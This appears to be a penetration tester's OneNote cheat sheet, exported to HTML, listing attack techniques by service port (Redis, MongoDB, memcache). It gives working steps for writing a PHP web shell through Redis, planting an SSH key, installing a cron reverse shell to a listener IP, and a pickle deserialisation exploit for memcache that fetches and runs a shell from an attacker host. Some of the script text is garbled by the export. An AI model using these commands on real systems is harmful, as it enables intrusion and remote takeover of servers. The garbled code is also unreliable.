    vertical-align:top;width:5.4041in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Get keys from
    database</p>
    </td>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:3.9291in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SELECT &lt;db #
    under &quot;# Keyspace&quot; in info&gt;<br>
        KEYS *<br>
        GET &lt;Key&gt;</p>
    </td>
   </tr>
   <tr>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:5.4041in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Web shell RCE</p>
    </td>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:3.9291in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>config set dir
    &lt;web server root directory&gt;<br>
        config set dbfilename shell.php<br>
        set test &quot;&lt;?php system($_REQUEST['cmd'] ?&gt;&quot;<br>
        save</p>
    </td>
   </tr>
   <tr>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:5.4041in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>SSH</p>
    </td>
    <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
    vertical-align:top;width:3.9979in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
    <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>import public
    key to redis:<br>
        (echo -e &quot;\n\n&quot;; cat ./.ssh/id_rsa.pub; echo -e
    &quot;\n\n&quot;) &gt; foo.txt<br>
        cat foo.txt | redis-cli -h &lt;ip&gt; -x set crackit<br>
        config set dir &lt;writable home directory&gt;<br>
        config set dbfilename &quot;authorized_keys&quot;<br>
        save</p>
    </td>
   </tr>
  </table>
  </div>
  <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>RCE Methods</span></li>
   <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><a
        href="https://book.hacktricks.xyz/pentesting/6379-pentesting-redis"><span
        style='font-family:Calibri;font-size:11.0pt'>https://book.hacktricks.xyz/pentesting/6379-pentesting-redis</span></a></li>
   </ul>
  </ul>
  </td>
  <td valign=top style='vertical-align:top;margin:0in;padding:0pt;width:.8284in;
  height:3.2493in;font-size:1pt'>
  <p style='font-size:1pt'></p>
  </td>
  <td valign=top style='vertical-align:top;margin:0in;padding:0pt;width:7.7548in;
  height:3.2493in;font-size:1pt'>
  <p style='font-size:1pt'></p>
  </td>
 </tr>
 <tr>
  <td valign=top style='vertical-align:top;margin:0in;padding:0pt;width:1px;
  height:.9402in;font-size:1pt'>
  <p style='font-size:1pt'>&nbsp;</p>
  </td>
  <td valign=top style='vertical-align:top;margin:0in;padding:0pt;width:.8284in;
  height:.9402in;font-size:1pt'>
  <p style='font-size:1pt'></p>
  </td>
  <td valign=top style='vertical-align:top;margin:0in;padding:0pt;width:7.7548in;
  height:.9402in'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>redis-cli -h
  192.168.136.69 flushall </p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>echo -e
  &quot;\n\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.49.136/80
  0&gt;&amp;1\n\n&quot;|redis-cli -h 192.168.136.69 -x set 1 </p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>redis-cli -h
  192.168.136.69 config set dir /var/spool/cron/ </p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>redis-cli -h
  192.168.136.69 config set dbfilename root </p>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>redis-cli -h
  192.168.136.69 save</p>
  </td>
 </tr>
 <tr>
  <td valign=top style='vertical-align:top;margin:0in;padding:0pt;width:1px;
  height:2.9763in;font-size:1pt'>
  <p style='font-size:1pt'>&nbsp;</p>
  </td>
  <td valign=top style='vertical-align:top;margin:0in;padding:0pt;width:.8284in;
  height:2.9763in;font-size:1pt'>
  <p style='font-size:1pt'></p>
  </td>
  <td valign=top style='vertical-align:top;margin:0in;padding:0pt;width:7.7548in;
  height:2.9763in;font-size:1pt'>
  <p style='font-size:1pt'></p>
  </td>
 </tr>
</table>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:3.893in'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:2.0861in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>6697 TCP /
irc</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:0in;width:2.302in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Monday,
June 28, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>10:28
AM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:.1263in;width:3.7666in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Incoming IRC connections
      encrypted via TLS/SSL</span></li>
 </ul>
 <p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
</ul>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:4.6854in'>

<div style='direction:ltr;margin-top:0in;margin-left:.075in;width:3.0243in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>27017 TCP /
mongodb</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.075in;width:2.4201in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Wednesday,
June 23, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>2:41
PM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:4.6854in'>

<p style='margin:0in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>

<div style='direction:ltr'>

<table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
 border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
 1pt' title="" summary="">
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.3298in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Connect to db</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.2618in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>mongo -u
  &lt;username&gt; -p &lt;password&gt; &lt;database&gt;</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.3493in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>show collections
  (mongodb version of mysql tables)</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.1729in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>show collections</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.3298in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>search for objects
  in a collection</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.1923in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>db.&lt;collection&gt;.find()</p>
  </td>
 </tr>
 <tr>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:1.3298in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>add command/object
  to collection</p>
  </td>
  <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
  vertical-align:top;width:3.1923in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
  <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>db.tasks.insert({&quot;cmd&quot;:&quot;&lt;bash
  command&gt;&quot;})</p>
  </td>
 </tr>
</table>

</div>

</div>

</div>

</div>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<p style='margin:0in'>&nbsp;</p>

<div style='direction:ltr;border-width:100%'>

<div style='direction:ltr;margin-top:0in;margin-left:0in;width:6.3375in'>

<div style='direction:ltr;margin-top:0in;margin-left:.2486in;width:3.177in'>

<p style='margin:0in;font-family:"Calibri Light";font-size:20.0pt'>11211 TCP /
memcache</p>

</div>

<div style='direction:ltr;margin-top:.0423in;margin-left:.2486in;width:2.4354in'>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>Monday,
August 16, 2021</p>

<p style='margin:0in;font-family:Calibri;font-size:10.0pt;color:#767676'>10:04
AM</p>

</div>

<div style='direction:ltr;margin-top:.434in;margin-left:0in;width:6.3375in'>

<ul style='direction:ltr;unicode-bidi:embed;margin-top:0in;margin-bottom:0in'>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>Tools</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>nc</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>telnet</span></li>
  </ul>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>memcache commands</span></li>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.4486in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>Retrieve cached
   items list</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.5152in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>stats items</p>
   </td>
  </tr>
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:3.4673in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>View cachedump of
   key retrieved from &quot;stats items&quot;<br>
      -<span style='mso-spacerun:yes'>  </span>STAT items:&lt;#&gt;:age 
75,
   etc<br>
      - 0 at the end for dumping unlimited lines</p>
   </td>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:1.5652in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>stats cachedump
   &lt;#&gt; 0</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>RCE -python pickling</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>pip install pymemcache</span></li>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>Generate malicious pickled
       python object to poison memcached object</span></li>
   <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>Script:</span></li>
   </ul>
  </ul>
 </ul>
 <div style='direction:ltr'>
 <table border=1 cellpadding=0 cellspacing=0 valign=top style='direction:ltr;
  border-collapse:collapse;border-style:solid;border-color:#A3A3A3;border-width:
  1pt;margin-left:.7083in' title="" summary="">
  <tr>
   <td style='border-style:solid;border-color:#A3A3A3;border-width:1pt;
   vertical-align:top;width:5.3493in;padding:2.0pt 3.0pt 2.0pt 3.0pt'>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>import
   pickle<br>
      import os<br>
      import sys<br>
      from pymemcache.client import base</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>class RCE:<br>
      <span style='mso-spacerun:yes'>    </span>def __reduce__(self)
br>
      <span style='mso-spacerun:yes'>        </span>cmd = 
 <a
   href="http://%7b%7d:5000/shell%20-O%20/tmp/shell">http://{}:5000/shell -O
   /tmp/shell</a> &amp;&amp; chmod 777 /tmp/shell &amp;&amp;
   /tmp/shell'.format(sys.argv[1]))<br>
      <span style='mso-spacerun:yes'>        </span>return o
em, (cmd,)</p>
   <p style='margin:0in;font-family:Calibri;font-size:11.0pt'>if __name__ ==
   '__main__':<br>
      <span style='mso-spacerun:yes'>    </span>client 
   base.Client((sys.argv[2], 11211))<br>
      <span style='mso-spacerun:yes'>    </span>client.set(sys.argv[
   pickle.dumps(RCE()))</p>
   </td>
  </tr>
 </table>
 </div>
 <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
  margin-bottom:0in'>
  <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
      style='font-family:Calibri;font-size:11.0pt'>python exploit.py
      &lt;attacker ip&gt; &lt;memcache server ip&gt;
      &lt;session:&lt;value&gt;&gt;</span></li>
  <ul type=circle style='direction:ltr;unicode-bidi:embed;margin-top:0in;
   margin-bottom:0in'>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>&lt;session:&lt;value&gt;&gt;
       comes from authenticated session cookie dumped from memcache server</span></li>
   <ul type=disc style='direction:ltr;unicode-bidi:embed;margin-top:0in;
    margin-bottom:0in'>
    <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
        style='font-family:Calibri;font-size:11.0pt'>this cookie is also stored
        in browser storage</span></li>
   </ul>
   <li style='margin-top:0;margin-bottom:0;vertical-align:middle'><span
       style='font-family:Calibri;font-size:11.0pt'>port 11211 for reverse
       shell my be necessary</span></li>
  </ul>
 </ul>
 <p style='margin:0in;margin-left:.375in;font-family:Calibri;font-size:11.0pt'>&nbsp;</p>
</ul>

</div>

</div>

</div>

<div>

<p style='margin:0in'>&nbsp;</p>

<p style='text-align:left;margin:0in;font-family:Arial;font-size:9pt;
color:#969696;direction:ltr'>Created with OneNote.</p>

</div>

</body>

</html>
